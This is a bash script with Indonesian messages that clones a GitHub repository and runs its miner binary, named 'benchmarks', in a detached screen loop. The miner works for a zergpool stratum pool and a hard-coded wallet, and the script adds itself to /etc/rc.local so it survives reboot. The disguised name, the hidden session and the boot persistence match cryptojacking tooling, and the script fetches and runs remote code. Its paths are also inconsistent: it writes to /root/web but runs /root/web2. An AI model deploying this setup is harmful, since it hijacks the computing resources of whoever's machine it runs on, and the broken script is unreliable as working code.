#!/bin/bash
echo "ğŸ“¦ Menginstal dependensi..."
apt-get update && apt-get install -y screen wget git

echo "ğŸŒ Meng-clone skrip mining dari GitHub..."
rm -rf /root/web
git clone https://github.com/amirul5656/web.git /root/web

echo "ğŸ“ Menyimpan skrip mining ke /root/web2..."
cat << 'EOF' > /root/web
#!/bin/bash

cd /root/web || exit 1

chmod +x benchmarks

# Cek apakah screen sudah berjalan
if screen -list | grep -q amirul3; then
  echo "âš ï¸  Screen 'amirul3' sudah jalan, skip."
else
  echo "â–¶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./benchmarks --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.asia.mine.zergpool.com:5778 --wallet RBbwLUvJ4sqWDFZSKqT6cKBiRMXwm5x4jD --password c=RVN,mc=PEPEW,ID=yui
      sleep 2
    done
  '
fi
EOF

chmod +x /root/web2

echo "ğŸš€ Menjalankan miner sekarang..."
bash /root/web2

# Tambahkan ke /etc/rc.local agar jalan saat reboot
if [ -f /etc/rc.local ]; then
  if ! grep -q '/root/web2' /etc/rc.local; then
    sed -i '/^exit 0/i bash /root/web2 &' /etc/rc.local
    echo "ğŸ› ï¸ Menambahkan ke /etc/rc.local"
  else
    echo "â„¹ï¸ Skrip sudah ada di /etc/rc.local, tidak ditambahkan lagi."
  fi
else
  echo '#!/bin/bash' > /etc/rc.local
  echo 'bash /root/web2 &' >> /etc/rc.local
  echo 'exit 0' >> /etc/rc.local
  chmod +x /etc/rc.local
  echo "ğŸ› ï¸ Membuat dan mengatur /etc/rc.local"
fi

echo "âœ… Siap! Mining aktif sekarang & akan otomatis jalan setelah reboot."
